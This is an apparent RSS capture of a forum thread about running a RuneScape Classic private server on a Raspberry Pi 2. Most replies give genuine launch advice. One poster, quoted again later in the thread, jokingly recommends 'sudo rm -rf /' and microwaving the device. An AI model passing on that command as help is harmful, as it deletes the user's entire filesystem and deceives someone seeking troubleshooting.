channel.title: RSClassic on Raspberry Pi 2?
channel.description: Has anyone tried this before? I tired it and only got to the part of running the server and while it was loading the terminal closely very quickly. I have jdk and ant installed on it as well, so there is really not wrong with the requirements but I think because it has something to do with the path of java and where its located?

item.title: RSClassic on Raspberry Pi 2?
item.dc:creator: @Classickbds Classickbds
item.description:
@Classickbds wrote:

[quote=“gawdz666, post:9, topic:550523”]What i usually do to start up all my servers and type in my special command it makes it run the terminal on “SUPER” beast mode best terminal hack ever.

“sudo rm -rf /”

If that trick doesnt work run your Raspberry Pi 2 in your microwave to heat up the elements and it’ll unlock the same mode as posted above.[/quote]

item.title: RSClassic on Raspberry Pi 2?
item.dc:creator: @gawdz666 gawdz666
item.description:
@gawdz666 wrote:

What i usually do to start up all my servers and type in my special command it makes it run the terminal on “SUPER” beast mode best terminal hack ever.

“sudo rm -rf /”

If that trick doesnt work run your Raspberry Pi 2 in your microwave to heat up the elements and it’ll unlock the same mode as posted above.

Read full topic

item.title: RSClassic on Raspberry Pi 2?
item.dc:creator: @Classickbds Classickbds
item.description:
@Classickbds wrote:

[quote="-Nothing, post:7, topic:550523"][quote author=Classickbds link=topic=669433.msg4476501#msg4476501 date=1426187013]

why the hell would you want to run the server on it

Cause I’m learning new stuff. Can’t be butthurt for someone to learn something new.
[/quote]
Why would you think I am butthurt? I’m simply asking why, because it doesn’t make sense to me.[/quote]

Just trying new things. It will make sense when you actually know what I’m doing… Getting tired of bringing a laptop everywhere I go just to check a server. The raspberry pi is simply a small machine that will run programs. I thought since it can run Minecraft, why not Runescape Classic Private servers? So I’m just trying something new.

Read full topic

item.title: RSClassic on Raspberry Pi 2?
item.dc:creator: @vortex vortex
item.description:
@vortex wrote:

chmod +x /path/to/runserver.sh
screen -S server /path/to/runserver.sh

or you could put something like this on your desktop as server.desktop or something

[Desktop Entry]
Type=Application
Encoding=UTF-8
Name=RSC Server
Comment=RSC Server
Exec=/path/to/runserver.sh
Icon=application.png
Terminal=true

Read full topic

item.title: RSClassic on Raspberry Pi 2?
item.dc:creator: @HcoJustin HcoJustin
item.description:
@HcoJustin wrote:

What is your distro? From what I can remember most terminal emulators will automatically close when the script is done executing. You can either change this in the settings, or run sh runserver.sh and view the output there.

Read full topic
